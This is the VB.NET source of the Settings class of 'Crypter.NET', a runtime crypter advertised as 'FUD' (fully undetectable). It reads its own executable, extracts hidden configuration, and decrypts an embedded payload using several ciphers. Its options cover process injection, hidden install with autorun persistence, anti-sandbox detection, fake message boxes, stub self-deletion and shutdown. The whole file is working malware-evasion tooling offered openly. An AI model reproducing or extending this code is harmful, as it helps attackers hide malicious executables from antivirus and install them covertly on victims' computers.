'=============================================================================
'                  Crypter.NET - FUD Runtime crypter 
'                 Copyright (C) 2010 fLaSh - Carlos.DF 
'                        <c4rl0s.pt@gmail.com> 
'                     <http://www.flash1337.com/>
' THIS SOFTWARE IS PROVIDED BY THE AUTHORS ``AS IS'' AND ANY EXPRESS OR
' IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
' OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
' IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY DIRECT, INDIRECT,
' INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
' NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
' DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
' THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
' (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
' THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'=============================================================================
Imports System.IO
Imports System.Text
Public Class Settings

#Const DEBUG_MOD = 0

#If DEBUG_MOD Then
    Private Const EXE_DEBUG As String = _
        "C:\Documents and Settings\fLaSh\Ambiente de trabalho\LinksCapture_crypted.exe"
#End If
    Private __EXE() As Byte
    Private __Algorithm As Integer
    Private __EncryptionKey As String
    Private __GZip As Boolean
    Private __Install As Boolean
    Private __InstallPath As String
    Private __InstallAddAutoRun As Boolean
    Private __InstallHidden As Boolean
    Private __AntiSandboxie As Boolean
    Private __StubSize As Int32
    Private __ProcessInject As Boolean
    Private __ProcessInjectPath As String
    Private __FakeMessageBox As Boolean
    Private __FakeMessageBoxTitle As String
    Private __FakeMessageBoxText As String
    Private __FakeMessageBoxIcon As Byte
    Private __FakeMessageBoxButtons As Byte
    Private __StubSuiecide As Boolean
    Private __StubSuiecideWait As Integer
    Private __Shutdown As Boolean
    Private __ShutdownType As Integer
    Private __Alright As Boolean

    Public Sub New()
        Me.LoadSettings()
    End Sub

    Private Sub LoadSettings()
#If DEBUG_MOD Then
        Dim bytEXE() As Byte = File.ReadAllBytes(EXE_DEBUG)
#Else
        Dim bytEXE() As Byte = File.ReadAllBytes(Application.ExecutablePath)
#End If
        Dim strEXE As String = Encoding.ASCII.GetString(bytEXE)
        Dim iPosX As Integer
        Dim iPosY As Integer
        Dim sData As String

        'Check initial position
        iPosX = strEXE.IndexOf("|S1|") + "|S1|".Length + 2
        iPosY = strEXE.IndexOf("|S2|") - 1
        'Extract data..
        sData = strEXE.Substring(iPosX, iPosY - iPosX)
        sData = HexToString(sData)
        'Split params..
        Dim strParams() As String = sData.Split("#")

        For Each sParam As String In strParams
            iPosX = sParam.IndexOf("=") + 1
            Select Case True
                Case sParam.Contains("Algorithm=")
                    __Algorithm = Convert.ToInt16(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("EncryptionKey=")
                    __EncryptionKey = sParam.Substring(iPosX).Trim
                Case sParam.Contains("GZip=")
                    __GZip = Convert.ToBoolean(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("ProcessInject=")
                    __ProcessInject = Convert.ToBoolean(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("ProcessInjectPath=")
                    __ProcessInjectPath = sParam.Substring(iPosX).Trim
                Case sParam.Contains("Install=")
                    __Install = Convert.ToBoolean(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("InstallPath=")
                    __InstallPath = sParam.Substring(iPosX).Trim
                Case sParam.Contains("InstallAddAutoRun=")
                    __InstallAddAutoRun = Convert.ToBoolean(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("InstallHidden=")
                    __InstallHidden = Convert.ToBoolean(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("AntiSandboxie=")
                    __AntiSandboxie = Convert.ToBoolean(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("Shutdown=")
                    __Shutdown = Convert.ToBoolean(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("ShutdownType=")
                    __ShutdownType = Convert.ToInt16(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("StubSize=")
                    __StubSize = Convert.ToInt32(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("FakeMessageBox=")
                    __FakeMessageBox = Convert.ToBoolean(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("FakeMessageBoxTitle=")
                    __FakeMessageBoxTitle = sParam.Substring(iPosX).Trim
                Case sParam.Contains("FakeMessageBoxText=")
                    __FakeMessageBoxText = sParam.Substring(iPosX).Trim
                Case sParam.Contains("FakeMessageBoxIcon=")
                    __FakeMessageBoxIcon = Convert.ToByte(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("FakeMessageBoxButtons=")
                    __FakeMessageBoxButtons = Convert.ToByte(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("StubSuiecide=")
                    __StubSuiecide = Convert.ToBoolean(sParam.Substring(iPosX).Trim)
                Case sParam.Contains("StubSuiecideWait=")
                    __StubSuiecideWait = Convert.ToInt16(sParam.Substring(iPosX).Trim)
            End Select
        Next

        ' Fix the exe path
        __ProcessInjectPath = FixPathVars(__ProcessInjectPath)
        __ProcessInjectPath = __ProcessInjectPath.Replace("/", "/")
        __ProcessInjectPath = __ProcessInjectPath.Replace("\\", "\")
        '
        __InstallPath = FixPathVars(__InstallPath)
        __InstallPath = __InstallPath.Replace("/", "/")
        __InstallPath = __InstallPath.Replace("\\", "\")

#If DEBUG_MOD Then
        Using oFS As New FileStream(EXE_DEBUG, FileMode.Open, FileAccess.Read)
#Else
        Using oFS As New FileStream(Application.ExecutablePath, FileMode.Open, FileAccess.Read)
#End If
            Using oBR As New BinaryReader(oFS, Encoding.UTF7)
                Const sKeyS As String = "|E1|"
                For i As Integer = 0 To CInt(oBR.BaseStream.Length) - 1
                    oBR.BaseStream.Position = i
                    Dim sKey As New String(oBR.ReadChars(sKeyS.Length))
                    If sKey = sKeyS Then
                        Dim byExe() As Byte = oBR.ReadBytes(__StubSize)
                        Select Case __Algorithm
                            Case 0 'RijnDael
                                byExe = Cryptor.RijnDael.Decrypt(byExe, __EncryptionKey)
                            Case 1 'RC4
                                byExe = Cryptor.RC4.Decrypt(byExe, __EncryptionKey)
                            Case 2 'MD5
                                byExe = Cryptor.MD5.Decrypt(byExe, __EncryptionKey)
                            Case 3 'XOR
                                byExe = Cryptor.XOR.Decrypt(byExe, __EncryptionKey)
                            Case 3 'Base64
                                byExe = Cryptor.Base64.Decrypt(byExe)
                        End Select
                        If __GZip Then
                            byExe = Compression.Decompress(byExe)
                        End If
                        __EXE = byExe
                        __Alright = True
                        Exit For
                    End If
                Next
                oBR.Close()
            End Using
            oFS.Close()
        End Using
    End Sub

    Public ReadOnly Property EXE() As Byte()
        Get
            Return __EXE
        End Get
    End Property

    Public ReadOnly Property EncryptionKey() As String
        Get
            Return __EncryptionKey
        End Get
    End Property

    Public ReadOnly Property Install() As Boolean
        Get
            Return __Install
        End Get
    End Property

    Public ReadOnly Property InstallPath() As String
        Get
            Return __InstallPath
        End Get
    End Property

    Public ReadOnly Property InstallAddAutoRun() As Boolean
        Get
            Return __InstallAddAutoRun
        End Get
    End Property

    Public ReadOnly Property InstallHidden() As Boolean
        Get
            Return __InstallHidden
        End Get
    End Property

    Public ReadOnly Property AntiSandboxie() As Boolean
        Get
            Return __AntiSandboxie
        End Get
    End Property

    Public ReadOnly Property Alright() As Boolean
        Get
            Return __Alright
        End Get
    End Property

    Public ReadOnly Property ProcessInject() As Boolean
        Get
            Return __ProcessInject
        End Get
    End Property

    Public ReadOnly Property ProcessInjectPath() As String
        Get
            Return __ProcessInjectPath
        End Get
    End Property

    Public ReadOnly Property FakeMessageBox() As Boolean
        Get
            Return __FakeMessageBox
        End Get
    End Property

    Public ReadOnly Property FakeMessageBoxTitle() As String
        Get
            Return __FakeMessageBoxTitle
        End Get
    End Property

    Public ReadOnly Property FakeMessageBoxText() As String
        Get
            Return __FakeMessageBoxText
        End Get
    End Property

    Public ReadOnly Property FakeMessageBoxIcon() As Byte
        Get
            Return __FakeMessageBoxIcon
        End Get
    End Property

    Public ReadOnly Property FakeMessageBoxButtons() As Byte
        Get
            Return __FakeMessageBoxButtons
        End Get
    End Property

    Public ReadOnly Property StubSuiecide() As Boolean
        Get
            Return __StubSuiecide
        End Get
    End Property

    Public ReadOnly Property StubSuiecideWait() As Integer
        Get
            Return __StubSuiecideWait
        End Get
    End Property

    Public ReadOnly Property Shutdown() As Boolean
        Get
            Return __Shutdown
        End Get
    End Property

    Public ReadOnly Property ShutdownType() As Integer
        Get
            Return __ShutdownType
        End Get
    End Property

End Class
